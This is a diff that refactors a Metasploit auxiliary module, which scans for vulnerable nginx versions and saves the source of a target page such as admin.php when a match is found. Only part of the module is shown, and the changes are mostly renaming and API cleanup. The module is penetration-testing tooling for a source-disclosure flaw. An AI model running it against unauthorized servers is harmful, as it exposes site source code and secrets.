@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -29,25 +26,19 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'Alligator Security Team',
           'Tiago Ferreira <tiago.ccna[at]gmail.com>',
         ],
       'License'        =>  MSF_LICENSE)
 
     register_options(
       [
-        OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
+        OptString.new('TARGETURI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
         OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
-      ], self.class)
-  end
-
-  def target_url
-    uri = normalize_uri(datastore['URI'])
-    "http://#{vhost}:#{rport}#{uri}"
+      ])
   end
 
   def run_host(ip)
-    uri = normalize_uri(datastore['URI'])
+    uri = normalize_uri(target_uri.path)
     path_save = datastore['PATH_SAVE']
 
     vuln_versions = [
@@ -71,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
         }, 25)
 
       if res.nil?
-        print_error("#{target_url} - nginx - Connection timed out")
+        print_error("#{full_uri} - nginx - Connection timed out")
         return
       else
         version = res.headers['Server']
@@ -79,17 +70,17 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       if vuln_versions.include?(version)
-        print_good("#{target_url} - nginx - Vulnerable version: #{version}")
+        print_good("#{full_uri} - nginx - Vulnerable version: #{version}")
 
         if (res and res.code == 200)
 
-          print_good("#{target_url} - nginx - Getting the source of page #{uri}")
+          print_good("#{full_uri} - nginx - Getting the source of page #{uri}")
 
           save_source = File.new("#{path_save}#{uri}","w")
           save_source.puts(res.body.to_s)
           save_source.close
 
-          print_status("#{target_url} - nginx - File successfully saved: #{path_save}#{uri}") if (File.exists?("#{path_save}#{uri}"))
+          print_good("#{full_uri} - nginx - File successfully saved: #{path_save}#{uri}") if (File.exist?("#{path_save}#{uri}"))
 
         else
           print_error("http://#{vhost}:#{rport} - nginx - Unrecognized #{res.code} response")
@@ -99,9 +90,9 @@ class Metasploit3 < Msf::Auxiliary
 
       else
         if version =~ /nginx/
-          print_error("#{target_url} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}")
+          print_error("#{full_uri} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}")
         else
-          print_error("#{target_url} - nginx - Cannot exploit: the remote server is not ngnix")
+          print_error("#{full_uri} - nginx - Cannot exploit: the remote server is not ngnix")
         end
         return
 
@@ -111,5 +102,4 @@ class Metasploit3 < Msf::Auxiliary
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
-
 end
